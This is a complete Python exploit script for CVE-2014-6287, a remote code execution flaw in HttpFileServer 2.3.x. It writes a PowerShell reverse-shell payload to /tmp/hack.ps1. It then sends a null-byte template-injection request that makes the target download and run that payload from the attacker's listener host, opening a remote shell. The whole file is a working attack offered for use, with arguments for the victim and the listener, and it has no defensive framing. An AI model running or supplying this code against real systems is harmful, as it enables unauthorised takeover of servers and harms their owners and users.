import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2014_6287
# HttpFileServer 2.3.x RCE.
class CVE2014_6287_RCE:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, rhost, lhost, lport):
        print (LogColors.BLUE + "victim: " + rhost  + "..." + LogColors.ENDC)
        self.rhost = rhost
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    def generate_ps_payload(self):
        print (LogColors.BLUE + "generate powershell payload..." + LogColors.ENDC)
        payload = "$client = New-Object System.Net.Sockets."
        payload += "TCPClient('" + self.lhost + "'," + self.lport + ");"
        payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        
        try:
            with open("/tmp/hack.ps1", "w") as f:
                f.write(payload)
                f.close()
        except Exception as e:
            print (LogColors.RED + "failed to generate payload :(" + LogColors.ENDC)
            print (str(e))
            sys.exit()
        else:
            print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)

    # send payload. update file with rev shell php code
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        payload = 'powershell.exe -nop -exec bypass -c "'
        payload += 'IEX(New-Object System.Net.WebClient).'
        payload += 'DownloadString(\'http://{}:8000/hack.ps1\');"'.format(self.lhost)
        payload = requests.utils.requote_uri(payload)
        try:
            r = self.session.get("http://" + self.rhost + "/?search=%00{.+exec|" + payload + ".}")
        except Exception as e:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.generate_ps_payload()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost', required = True, help = "target host")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    rhost = args['rhost']
    ip, port = args['ip'], args['port']
    cve = CVE2014_6287_RCE(rhost, ip, port)
    cve.exploit()

